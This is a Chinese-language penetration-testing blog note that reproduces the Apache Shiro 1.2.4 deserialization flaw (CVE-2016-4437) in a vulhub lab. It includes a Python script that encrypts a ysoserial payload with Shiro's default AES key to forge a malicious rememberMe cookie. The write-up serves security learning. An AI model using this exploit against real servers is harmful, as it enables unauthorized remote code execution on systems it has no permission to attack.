{"title":"渗透测试笔记 - day49 框架漏洞（Apache Shiro）","date":"2022-04-30T00:00:00.000Z","date_formatted":{"ll":"Apr 30, 2022","L":"04/30/2022","MM-DD":"04-30"},"link":"2022/04/30/渗透测试笔记 - day49 框架漏洞（Apache Shiro）","updated":"2023-03-17T12:07:41.501Z","content":"<h2 id=\"apache-shiro-1.2.4反序列化漏洞（cve-2016-4437）\">Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）<a title=\"#apache-shiro-1.2.4反序列化漏洞（cve-2016-4437）\" href=\"#apache-shiro-1.2.4反序列化漏洞（cve-2016-4437）\"></a></h2>\n<ul>\n<li>环境：kali / docker / vulhub</li>\n<li>Apache Shiro框架提供了RememberMe功能，用户登录成功后会生成经过加密并编码的cookie，在服务端接受cookie后，序列化=》AES加密=》Base64编码。攻击者只要找到AES加密的密钥，就可以构造一个恶意的恶意对象，对其进行加密。然后将其作为cookie的rememberMe字段发送，Shiro将rememberMe进行解密并反序列后，最终造成反序列化漏洞。</li>\n<li>影响版本：Apache Shiro &lt;= 1.2.4</li>\n<li>漏洞特征：返回包中存在rememberme</li>\n</ul>\n<h3 id=\"漏洞复现：\">漏洞复现：<a title=\"#漏洞复现：\" href=\"#漏洞复现：\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204081846719.png\" alt=\"image-20220408184642559\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用默认密码登录：admin;vulhub</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204081847626.png\" alt=\"image-20220408184714519\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用exp检测可用key</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204101230350.png\" alt=\"image-20220410123033303\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用ysoserial反序列化工具生成poc</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204101236145.png\" alt=\"image-20220410123621114\" loading=\"lazy\" class=\"φbp\"></p>\n<p>使用默认AES 的key对payload进行加密</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> uuid</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encode_rememberme</span>():</span><br><span class=\"line\">    f = <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;1.poc&#x27;</span>,<span class=\"string\">&#x27;rb&#x27;</span>)</span><br><span class=\"line\">    BS = AES.block_size</span><br><span class=\"line\">    pad = <span class=\"keyword\">lambda</span> s: s + ((BS - <span class=\"built_in\">len</span>(s) % BS) * <span class=\"built_in\">chr</span>(BS - <span class=\"built_in\">len</span>(s) % BS)).encode()</span><br><span class=\"line\">    key = base64.b64decode(<span class=\"string\">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)</span><br><span class=\"line\">    iv = uuid.uuid4().<span class=\"built_in\">bytes</span></span><br><span class=\"line\">    encryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">    file_body = pad(f.read())</span><br><span class=\"line\">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> base64_ciphertext</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    payload = encode_rememberme()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;rememberMe=&#123;0&#125;&quot;</span>.<span class=\"built_in\">format</span>(payload.decode()))</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204081948504.png\" alt=\"image-20220408194802436\" loading=\"lazy\" class=\"φbp\"></p>\n<p>执行脚本</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204101239996.png\" alt=\"image-20220410123928920\" loading=\"lazy\" class=\"φbp\"></p>\n<p>将伪造好的cookie发送至服务器</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204101243927.png\" alt=\"image-20220410124350786\" loading=\"lazy\" class=\"φbp\"></p>\n<p>进入环境查看执行结果</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204101251255.png\" alt=\"image-20220410125134199\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n","prev":{"title":"渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）","link":"2022/05/02/渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）"},"next":{"title":"渗透测试笔记 - day48 框架漏洞（ThinkPHP）","link":"2022/04/26/渗透测试笔记 - day48 框架漏洞（ThinkPHP）"},"plink":"https://Lq0ne.github.io/2022/04/30/渗透测试笔记 - day49 框架漏洞（Apache Shiro）/","toc":[{"id":"apache-shiro-1.2.4反序列化漏洞（cve-2016-4437）","title":"Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）","index":"1","children":[{"id":"漏洞复现：","title":"漏洞复现：","index":"1.1"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"April 30, 2022","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2022/04/30/渗透测试笔记 - day49 框架漏洞（Apache Shiro）/\" title=\"渗透测试笔记 - day49 框架漏洞（Apache Shiro）\">https://Lq0ne.github.io/2022/04/30/渗透测试笔记 - day49 框架漏洞（Apache Shiro）/</a>"},"reading_time":"407 words in 3 min"}